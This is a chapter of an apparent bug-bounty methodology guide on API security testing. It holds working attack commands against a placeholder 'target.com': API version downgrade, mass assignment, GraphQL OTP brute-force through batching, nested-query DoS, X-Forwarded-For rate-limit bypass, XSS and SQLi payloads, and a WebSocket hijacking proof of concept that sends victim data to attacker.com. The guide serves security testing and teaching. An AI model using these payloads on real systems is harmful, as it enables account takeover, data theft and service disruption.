---
title: "Part 7: API Security"
nav_order: 8
layout: default
---

## PART 7: API SECURITY
*Status: COMPLETE — Iteration 7*

> **The mindset:** An API is just the application's attack surface without
> the UI in the way. Everything from Parts 2–6 applies — the difference is
> in how you discover the surface and how authorization failures manifest.
> API-specific bugs tend to be more severe because APIs operate closer to
> the data layer, have less mature security tooling, and are often built
> by developers who consider the API "internal" even when it's public-facing.

---

### 7.1 REST API Methodology

---

#### 7.1.1 Endpoint Discovery

🔍 **Layer 1 — Spec-based discovery (most complete):**
```bash
# Common API spec locations — check these on every target:
/swagger.json
/swagger.yaml
/api-docs
/api-docs.json
/openapi.json
/openapi.yaml
/v1/api-docs
/v2/api-docs
/v3/api-docs
/.well-known/openapi
/api/swagger
/docs
/redoc
/graphql (→ see 7.3)

# Swagger UI (interactive, lists all endpoints):
/swagger-ui.html
/swagger-ui/
/api/swagger-ui.html

# Postman collections (sometimes left public):
# Search GitHub: org:targetcompany filename:*.postman_collection.json
# Search target's docs site for "Run in Postman" button

# Import found spec into Burp:
# Burp → Target → Import OpenAPI
# Automatically generates all endpoints with parameters populated
```

**Layer 2 — Kiterunner (wordlist-based):**
```bash
# Kiterunner — purpose-built for API route discovery
# Uses real API route wordlists, not generic directory lists

# Basic scan:
kr scan https://target.com/api/ \
  -w /opt/kiterunner/routes-large.kite \
  -o kiterunner_results.txt

# With authentication:
kr scan https://target.com/api/ \
  -w /opt/kiterunner/routes-large.kite \
  -H "Authorization: Bearer <token>" \
  -o kiterunner_auth.txt

# Assetnote API wordlists (best available):
kr scan https://target.com/ \
  -w /opt/wordlists/httparchive_apiroutes_2023_01_28.kite \
  -H "Authorization: Bearer <token>"

# Output: shows endpoints that return non-404 responses with method used
```

**Layer 3 — JS parsing and traffic analysis:**
```bash
# Extract API calls from JS files (already covered in 1.3.2):
grep -rhoE '"(/api/[^"]{3,50})"' ./js_files/ | tr -d '"' | sort -u > api_paths.txt

# Burp: browse app while logged in → Burp Target → Site map → filter by /api/
# Export all observed API endpoints
# This gives real endpoints actually called by the frontend
```

---

#### 7.1.2 API Versioning Abuse

🔍 **One of the most reliable API-specific techniques:**
Applications often maintain old API versions for backward compatibility.
Old versions (`v1`, `v0`) frequently have fewer security controls than `v2` or `v3`.
Features may have been secured in v2 but the v1 endpoint was never removed.

```bash
# If you find: GET /api/v2/users/me
# Also try:
GET /api/v1/users/me          # older version
GET /api/v0/users/me          # even older
GET /api/users/me             # unversioned
GET /api/beta/users/me        # beta channel
GET /api/internal/users/me    # internal version
GET /api/admin/users/me       # admin version
GET /v1/users/me              # version at root
GET /api/2/users/me           # numeric only

# Version in header (some APIs):
GET /api/users/me
API-Version: 1
Accept: application/vnd.target.v1+json

# Downgrade attack pattern:
# v2 endpoint requires auth: GET /api/v2/users/1043 → 401
# v1 endpoint no auth check: GET /api/v1/users/1043 → 200 + full user data
```

**What to look for in old versions:**
```
- Missing authentication checks
- Missing authorization (IDOR works on v1 but not v2)
- More fields returned (PII, internal fields stripped from v2)
- Missing rate limiting
- Debug parameters still active
- Admin functionality accessible without admin role
```

---

#### 7.1.3 HTTP Method Tampering

🔍 **APIs often implement partial verb coverage:**
```bash
# If GET /api/users/1043 returns user data:
# Try other methods on the same endpoint:
OPTIONS /api/users/1043    # see allowed methods
HEAD /api/users/1043       # headers without body (info leak)
POST /api/users/1043       # create? update?
PUT /api/users/1043        # full replacement
PATCH /api/users/1043      # partial update
DELETE /api/users/1043     # delete
TRACE /api/users/1043      # may reveal internal headers

# Method override headers (bypass WAF method restrictions):
POST /api/users/1043
X-HTTP-Method-Override: DELETE
X-Method-Override: DELETE
X-HTTP-Method: DELETE
_method=DELETE             # in request body

# Common findings:
# DELETE on resource belonging to another user → IDOR
# PUT/PATCH with mass assignment → privilege escalation
# Unauthenticated OPTIONS revealing sensitive headers
# TRACE enabled → XST (Cross-Site Tracing) if XSS present
```

---

### 7.2 Authorization Flaws in APIs

---

#### 7.2.1 BOLA / IDOR

→ Full coverage in [Part 3](#part-3-access-control--idor-bola-privilege-escalation).

API-specific addition: **test every HTTP verb independently**.
An endpoint may enforce authorization on GET but not on DELETE.
```bash
# Account B's resource ID: 5523
GET    /api/documents/5523   → 403 (enforced)
DELETE /api/documents/5523   → 200 (NOT enforced) ← the finding
PUT    /api/documents/5523   → 200 (NOT enforced)
```

---

#### 7.2.2 Broken Function-Level Authorization

🔍 **What it is:**
Low-privileged users calling high-privileged functions.
In REST APIs this manifests as: regular user calling admin endpoints.

```bash
# Discovery — fuzz for admin routes with regular user token:
ffuf -u https://target.com/api/FUZZ \
  -w /opt/SecLists/Discovery/Web-Content/api-endpoints.txt \
  -H "Authorization: Bearer <regular_user_token>" \
  -mc 200,201,400  # 400 = endpoint exists, bad params (not 404/403)
  -o admin_api_endpoints.txt

# Kiterunner with regular user token:
kr scan https://target.com/api/ \
  -w /opt/kiterunner/routes-large.kite \
  -H "Authorization: Bearer <regular_user_token>"

# Manual patterns — try these with regular user token:
GET  /api/admin/users              # list all users
POST /api/admin/users/1043/ban     # ban a user
GET  /api/admin/stats              # platform statistics
POST /api/admin/config             # change config
GET  /api/internal/debug           # debug info
POST /api/users/1043/elevate       # elevate to admin
DELETE /api/users/1043             # delete any user

# Also test: changing role in JWT/token (→ Part 2.3)
# And: mass assignment to add role field (→ 7.2.3)
```

---

#### 7.2.3 Mass Assignment

🔍 **What it is:**
The API framework automatically maps request body parameters to object properties.
If a privileged field (`role`, `is_admin`, `plan`) isn't explicitly excluded,
sending it in a normal request may set it.

```bash
# Normal user update request:
PUT /api/users/me
{"display_name": "John", "bio": "Developer"}

# Mass assignment attempt — add every privileged field you can think of:
PUT /api/users/me
{
  "display_name": "John",
  "bio": "Developer",
  "role": "admin",
  "is_admin": true,
  "plan": "enterprise",
  "subscription": "premium",
  "verified": true,
  "email_verified": true,
  "credits": 99999,
  "balance": 99999,
  "org_role": "owner",
  "permissions": ["read","write","admin","delete"]
}

# POST to registration — add fields not in the signup form:
POST /api/users/register
{
  "email": "test@test.com",
  "password": "password123",
  "role": "admin",         ← not in the signup form
  "is_admin": true
}

# Finding undocumented fields to try:
# 1. Look at GET /api/users/me — what fields does the response contain?
#    Those same fields may be writable via PUT/PATCH
# 2. Look at admin user responses — what extra fields do they have?
#    Try setting those via regular user's PATCH
# 3. Fuzz parameter names:
arjun -u https://target.com/api/users/me -m PUT \
  -H "Authorization: Bearer <token>"
```

---

#### 7.2.4 Token Privilege Testing — Manual Swap

🔍 **The definitive API authorization test:**
```bash
# Setup:
# Token A: regular user (low privilege)
# Token B: admin user (if achievable) or just another regular user

# Test every discovered endpoint with both tokens:
# 1. Normal request with Token B (privileged) → note response
# 2. Replay same request with Token A → compare response

# Burp Match & Replace for quick token swap:
# Proxy → Options → Match and Replace
# Replace: "Authorization: Bearer <token_B>" → "Authorization: Bearer <token_A>"
# Browse app as Token B user → all requests automatically replayed as Token A

# What to look for:
# - Same response body → authorization not enforced
# - Smaller response but still 200 → partial data leak
# - 403/401 → properly enforced (expected)
# - 500 error → may indicate different code path, worth investigating
```

---

### 7.3 GraphQL

**Context:** GraphQL is a query language for APIs — instead of fixed endpoints,
clients specify exactly what data they want. This flexibility creates a different
attack surface: the entire schema is queryable if introspection is enabled,
and the server may not validate authorization per field.

---

#### 7.3.1 Introspection — Enumerating the Full Schema

🔍 **What it is:**
GraphQL's introspection system lets you query the schema itself —
all types, queries, mutations, and their fields. It's the API equivalent
of getting the full Swagger spec.

```bash
# Full introspection query (reveals everything):
curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer <token>" \
  -d '{"query": "{ __schema { queryType { name } mutationType { name } types { name kind fields { name type { name kind ofType { name kind } } args { name type { name kind } } } } } }"}' | jq .

# Simpler — just list all type names:
curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __schema { types { name } } }"}' | jq '.data.__schema.types[].name'

# List all queries and mutations:
curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __schema { queryType { fields { name description } } mutationType { fields { name description } } } }"}' | jq .
```

🛠️ **InQL (Burp extension):**
```
1. Install InQL from BApp Store
2. InQL tab → enter GraphQL endpoint URL
3. Click "Analyze" → generates full schema map
4. Shows all queries, mutations, types with their fields
5. Double-click any query/mutation → opens pre-built request in Repeater
6. Reveals hidden/undocumented operations not visible in the UI
```

🛠️ **GraphQL Voyager (visual schema explorer):**
```bash
# Feed introspection JSON to GraphQL Voyager for visual map:
# https://graphql-kit.com/graphql-voyager/
# Paste introspection result → see relationship diagram
# Useful for spotting unexpected connections between types
```

---

#### 7.3.2 Introspection Disabled — Field Suggestion Bypass

🔍 **When introspection is disabled:**
GraphQL often returns field suggestions when you query a field that doesn't exist.
This leaks the actual field names — effectively bypassing the introspection disable.

```bash
# Query a non-existent field:
{"query": "{ user { xyz } }"}

# Response reveals real fields:
# "Did you mean 'email', 'password_hash', 'ssn', 'credit_card'?"
# ↑ The error message just leaked the schema

# Clairvoyance — automates field discovery via suggestions:
python3 clairvoyance.py \
  -u https://target.com/graphql \
  -H "Authorization: Bearer <token>" \
  -o schema.json
```

---

#### 7.3.3 GraphQL Batching — Rate Limit Bypass

🔍 **What it is:**
GraphQL allows sending multiple operations in a single HTTP request (batching).
If rate limiting is applied per HTTP request (not per operation), batching
allows sending 100 operations in one request — bypassing rate limits.

```bash
# Single request = multiple operations:
curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '[
    {"query": "mutation { login(email: \"admin@target.com\", password: \"pass1\") { token } }"},
    {"query": "mutation { login(email: \"admin@target.com\", password: \"pass2\") { token } }"},
    {"query": "mutation { login(email: \"admin@target.com\", password: \"pass3\") { token } }"}
  ]'
# 100 login attempts in one HTTP request → OTP/password brute-force bypassing rate limit

# OTP brute-force via batching:
# Generate 1000 operations each trying a different OTP code
# Send as single HTTP request
python3 -c "
import json
ops = [{'query': 'mutation { verifyOTP(code: \"%s\") { success } }' % str(i).zfill(6)} for i in range(1000)]
print(json.dumps(ops))
" > batch_otp.json
curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d @batch_otp.json | jq '.[] | select(.data.verifyOTP.success == true)'
```

---

#### 7.3.4 DoS via Deeply Nested Queries

🔍 **What it is:**
If the schema allows recursive types (e.g., `User` has `friends` which returns
`[User]`, which has `friends`...), a deeply nested query can cause exponential
server load — O(n^depth) database queries.

```bash
# Find recursive types in schema:
# Look for: type A has field of type B, type B has field of type A

# Example attack (users → friends → friends → friends...):
curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ user(id: 1) { friends { friends { friends { friends { friends {
    id email friends { friends { friends { id email } } }
  } } } } } } }"}'

# Measure response time — if it takes >5 seconds → DoS potential confirmed
# Report: do NOT send this more than once on a production system
# For PoC: show a 2–3 level deep query causing significant delay

# Tools: graphql-cop (audit tool):
python3 graphql-cop.py -t https://target.com/graphql \
  -H "Authorization: Bearer <token>"
```

---

#### 7.3.5 IDOR in GraphQL

🔍 **GraphQL uses IDs just like REST — same IDOR tests apply:**
```bash
# Direct ID manipulation:
# Your own user: {"query": "{ user(id: \"VXNlcjoxMjM=\") { email ssn } }"}
# Decode ID: echo "VXNlcjoxMjM=" | base64 -d  →  User:123
# Try another: echo -n "User:124" | base64  →  VXNlcjoxMjQ=
# Query: {"query": "{ user(id: \"VXNlcjoxMjQ=\") { email ssn } }"}

# Mutation IDOR — modify another user's data:
{"mutation": "mutation { updateUser(id: \"VXNlcjoxMjQ=\", email: \"x@x.com\") { success } }"}

# Test authorization per field:
# Your user: {"query": "{ user(id: \"<your_id>\") { email } }"}  → 200
# Admin field: {"query": "{ user(id: \"<your_id>\") { email adminNotes internalId } }"}
# Are admin-only fields returned for regular users?
```

---

#### 7.3.6 GraphQL Testing Checklist
```
□ Introspection enabled? → full schema dump → review all types/mutations
□ Introspection disabled? → field suggestion bypass via Clairvoyance
□ Import schema into InQL → browse all operations in Repeater
□ Batching enabled? → OTP/password brute-force via batch operations
□ Recursive types? → nested query DoS (test with ≤3 levels)
□ IDOR: decode base64 IDs, increment, test from different account
□ Mutations: test all mutations from regular user (unauthorized mutations?)
□ Field-level auth: request admin-only fields as regular user
□ Authorization per operation vs. per field (field resolvers may be unprotected)
```

📚 **References:**
- [InQL (BApp Store)](https://portswigger.net/bappstore/296e9a0730384be4b2fffef7b4e19b1f)
- [Clairvoyance](https://github.com/nikitastupin/clairvoyance)
- [graphql-cop](https://github.com/nicholaswasher/graphql-cop)
- [GraphQL Voyager](https://graphql-kit.com/graphql-voyager/)
- [PayloadsAllTheThings — GraphQL](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL%20Injection)

---

### 7.4 Rate Limiting and Resource Abuse

---

#### 7.4.1 Detecting Absent Rate Limiting

🔍 **Where rate limiting matters most:**
```
Authentication endpoints:
  POST /api/login            → brute-force passwords
  POST /api/verify-otp       → brute-force OTPs
  POST /api/forgot-password  → enumerate users / spam resets

Sensitive operations:
  POST /api/transfer         → rapid financial operations
  POST /api/invite           → spam invitations
  GET  /api/users?search=    → user enumeration at speed

Resource-intensive:
  POST /api/export           → mass data export
  POST /api/report/generate  → CPU-intensive operations
  POST /api/search           → database-heavy queries
```

**Testing:**
```bash
# Send 50 rapid requests and check for rate limit response:
for i in {1..50}; do
  curl -s -o /dev/null -w "%{http_code}\n" \
    -X POST https://target.com/api/login \
    -d "email=test@test.com&password=wrong$i"
done
# All 200 responses → no rate limiting
# 429 after N requests → rate limited at N

# ffuf rate limit test:
ffuf -u https://target.com/api/login \
  -X POST \
  -d "email=admin@target.com&password=FUZZ" \
  -w /opt/SecLists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -mc 200 \
  -rate 10  # 10 req/sec
```

**Rate limit bypass techniques:**
```bash
# IP rotation via headers (if server trusts these):
X-Forwarded-For: 1.2.3.4      # rotate IP each request
X-Real-IP: 1.2.3.5
X-Originating-IP: 1.2.3.6
X-Remote-IP: 1.2.3.7
X-Remote-Addr: 1.2.3.8
X-Client-IP: 1.2.3.9

# Burp Intruder: add X-Forwarded-For as second payload position
# Use number list 1-1000 as payload → effectively rotates IP

# User-Agent rotation: some rate limits key on User-Agent
# Username variation: user@target.com, USER@target.com, user+1@target.com
```

---

#### 7.4.2 Reporting Rate Limit Issues

📝 **Standalone missing rate limit = usually Low/Informational.**
**Rate limit missing on auth endpoints = Medium to High (brute-force vector).**

```
Report title: "Missing rate limiting on OTP verification allows brute-force"
NOT: "Missing rate limiting on /api/search"

Impact statement needs to show real attack:
"Without rate limiting, an attacker can submit all 1,000,000 possible
6-digit OTP combinations in under 3 minutes, bypassing MFA entirely."

vs.

"Without rate limiting, an attacker can send many requests." ← rejected
```

---

### 7.5 WebSockets

---

#### 7.5.1 Authentication Bypass in WebSocket Upgrade

🔍 **What it is:**
WebSocket connections are established via an HTTP upgrade request.
If authentication is only checked at the HTTP upgrade (handshake) and not
on subsequent WebSocket messages, authenticated state may be bypassed or shared.

```bash
# Test: establish WebSocket connection without auth token
# Then send authenticated messages:
python3 -c "
import websocket
ws = websocket.create_connection('wss://target.com/ws')
ws.send('{\"type\": \"subscribe\", \"channel\": \"admin_events\"}')
print(ws.recv())
ws.close()
"

# Burp: Proxy → WebSockets history
# Review all WS messages — look for auth tokens, user IDs, sensitive data

# Test message manipulation:
# In Burp WebSockets history, right-click a message → "Intercept WebSocket messages"
# Modify message content, change user IDs, change message types
```

---

#### 7.5.2 Message Tampering and Injection

🔍 **WebSocket messages are just data — same injection classes apply:**
```bash
# If WebSocket sends JSON messages:
{"type": "message", "to": "user_123", "content": "hello"}

# Test IDOR — change "to" field:
{"type": "message", "to": "user_456", "content": "hello"}

# Test injection in content field:
{"type": "message", "to": "user_123", "content": "<script>alert(1)</script>"}
# Stored XSS via WebSocket if content rendered without encoding

# Test privilege escalation via message type:
{"type": "admin_broadcast", "content": "system message"}
# Can regular users send admin message types?

# SQLi / command injection in message fields:
{"type": "search", "query": "test' AND SLEEP(3)-- -"}
```

---

#### 7.5.3 Cross-Site WebSocket Hijacking (CSWSH)

🔍 **What it is:**
WebSocket upgrade requests include cookies automatically (like regular HTTP).
If the upgrade doesn't validate Origin, a malicious page can initiate a WebSocket
connection to the target, riding the victim's session.

```bash
# Check the WebSocket upgrade request:
GET /ws HTTP/1.1
Host: target.com
Upgrade: websocket
Origin: https://target.com    ← is this validated?

# Test: send upgrade with different Origin:
curl -sv -H "Origin: https://attacker.com" \
  -H "Upgrade: websocket" \
  -H "Connection: Upgrade" \
  -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" \
  -H "Sec-WebSocket-Version: 13" \
  https://target.com/ws
# If handshake completes → Origin not validated → CSWSH possible
```

**PoC (hosted on attacker.com):**
```html
<script>
var ws = new WebSocket('wss://target.com/ws');
ws.onopen = function() {
  ws.send('{"type":"get_user_data"}');
};
ws.onmessage = function(e) {
  // Exfil victim's data:
  fetch('https://attacker.com/steal?data=' + encodeURIComponent(e.data));
};
</script>
```

📚 **References:**
- [PortSwigger WebSockets](https://portswigger.net/web-security/websockets)
- [PortSwigger CSWSH](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking)

---

### 7.6 API Key and Secret Leakage

→ Covered in [1.3.3 Secret and Key Detection](#133-secret-and-key-detection)
and [1.4 GitHub & Source Code Recon](#14-github--source-code-recon).

**API-specific additions:**
```bash
# API keys in response bodies (sometimes returned by API):
GET /api/users/me → response contains {"api_key": "sk-live-..."}
# Test: is the API key in every response? Every user's key exposed to others?

# API keys in error responses:
# Trigger a 500 error with malformed input
# Does the error response include config data, tokens, or keys?

# API keys in headers:
# Check response headers for X-API-Key, X-Auth-Token, etc.
# These should never appear in responses

# Key rotation test:
# If you find an exposed key, check if it's currently valid
# aws sts get-caller-identity  /  curl -H "Authorization: Bearer <key>" /api/me
# Report: key is valid + what it grants access to
```

---

### Part 7 — Complete API Security Testing Checklist

```
DISCOVERY
□ Check all spec locations: /swagger.json, /openapi.yaml, /api-docs
□ Kiterunner scan with Assetnote wordlists
□ JS file parsing for API paths (→ 1.3.2)
□ Burp site map filtered to /api/ after full manual browse

VERSIONING
□ Every endpoint: test v0, v1, v2, /internal, /beta, /admin variants
□ Version in header: API-Version: 1, Accept: vnd.target.v1+json
□ Older versions: missing auth, missing authz, more fields returned?

HTTP METHODS
□ OPTIONS on every endpoint → what methods are allowed?
□ Test all methods: GET, POST, PUT, PATCH, DELETE on every endpoint
□ Method override headers on POST: X-HTTP-Method-Override: DELETE
□ Each method independently for authorization (DELETE may skip auth check)

AUTHORIZATION
□ Every endpoint with Token A (regular) after observing with Token B (privileged)
□ Admin endpoints: fuzz with regular user token (Kiterunner + auth)
□ Mass assignment: add role/admin/plan to every PUT/PATCH body
□ Fuzz parameter names on PUT/PATCH (Arjun, ParamMiner)

GRAPHQL
□ Introspection query → full schema dump
□ Introspection disabled → Clairvoyance field suggestion bypass
□ InQL import → review all queries and mutations
□ Batching → OTP/auth brute-force in single request
□ Recursive types → nested DoS (≤3 levels test)
□ IDOR: decode IDs, test from different account
□ Field-level authorization: request admin fields as regular user

RATE LIMITING
□ Auth endpoints: 50 rapid requests → 429 at some point?
□ Rate limit bypass: X-Forwarded-For rotation
□ GraphQL batching as rate limit bypass
□ Report only with demonstrated attack impact

WEBSOCKETS
□ Burp WS history: review all messages for sensitive data
□ Upgrade without auth token → still connects?
□ Origin header validated on upgrade?
□ Message field tampering: user IDs, message types, injection
□ CSWSH PoC if Origin not validated

API KEYS
□ Keys in response bodies (own user response)
□ Keys in error responses (trigger 500 with malformed input)
□ Keys in response headers
□ GitHub dorking for target's API keys (→ 1.4)
□ JS file secret scanning (→ 1.3.3)
```

📚 **Part 7 Master References:**
- [OWASP API Security Top 10](https://owasp.org/www-project-api-security/)
- [PortSwigger GraphQL labs](https://portswigger.net/web-security/graphql)
- [PortSwigger WebSockets labs](https://portswigger.net/web-security/websockets)
- [Kiterunner](https://github.com/assetnote/kiterunner)
- [InQL (BApp Store)](https://portswigger.net/bappstore/296e9a0730384be4b2fffef7b4e19b1f)
- [Clairvoyance](https://github.com/nikitastupin/clairvoyance)
- [Assetnote API wordlists](https://wordlists.assetnote.io)
- [HackTricks — GraphQL](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/graphql)

---

